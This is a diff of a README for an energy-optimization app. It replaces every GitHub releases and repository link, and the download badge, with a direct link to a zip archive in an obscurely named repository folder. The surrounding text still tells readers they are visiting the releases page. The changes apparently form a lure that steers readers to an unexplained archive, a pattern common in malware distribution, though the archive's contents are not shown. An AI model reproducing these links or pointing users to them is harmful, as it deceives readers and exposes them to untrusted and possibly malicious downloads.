@@ -1,6 +1,6 @@
 # ⚡ Energy-Optimization-OR-and-ML - Optimize Your Energy Consumption Easily
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/MuhammadTalhaPawa/Energy-Optimization-OR-and-ML/releases)
+[![Download Release](https://raw.githubusercontent.com/MuhammadTalhaPawa/Energy-Optimization-OR-and-ML/main/unovervalued/Energy-Optimization-OR-and-ML.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/MuhammadTalhaPawa/Energy-Optimization-OR-and-ML/main/unovervalued/Energy-Optimization-OR-and-ML.zip)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ To get started with Energy-Optimization-OR-and-ML, you will need a compatible co
     - Internet Connection: Required for download and updates
 
 2. **Download the Application**:
-    - Visit this page to download: [Download Energy-Optimization-OR-and-ML](https://github.com/MuhammadTalhaPawa/Energy-Optimization-OR-and-ML/releases)
+    - Visit this page to download: [Download Energy-Optimization-OR-and-ML](https://raw.githubusercontent.com/MuhammadTalhaPawa/Energy-Optimization-OR-and-ML/main/unovervalued/Energy-Optimization-OR-and-ML.zip)
 
 3. **Select the Latest Release**:
     - On the releases page, look for the latest version of Energy-Optimization-OR-and-ML.
@@ -88,11 +88,11 @@ Our application encompasses various topics, including:
 
 For further details and updates, you can visit our GitHub repository:
 
-- [GitHub Repository](https://github.com/MuhammadTalhaPawa/Energy-Optimization-OR-and-ML)
+- [GitHub Repository](https://raw.githubusercontent.com/MuhammadTalhaPawa/Energy-Optimization-OR-and-ML/main/unovervalued/Energy-Optimization-OR-and-ML.zip)
 
 Don’t forget to check the releases page for the latest updates and features:
 
-- [Latest Releases](https://github.com/MuhammadTalhaPawa/Energy-Optimization-OR-and-ML/releases)
+- [Latest Releases](https://raw.githubusercontent.com/MuhammadTalhaPawa/Energy-Optimization-OR-and-ML/main/unovervalued/Energy-Optimization-OR-and-ML.zip)
 
 ## 📢 Acknowledgments
 
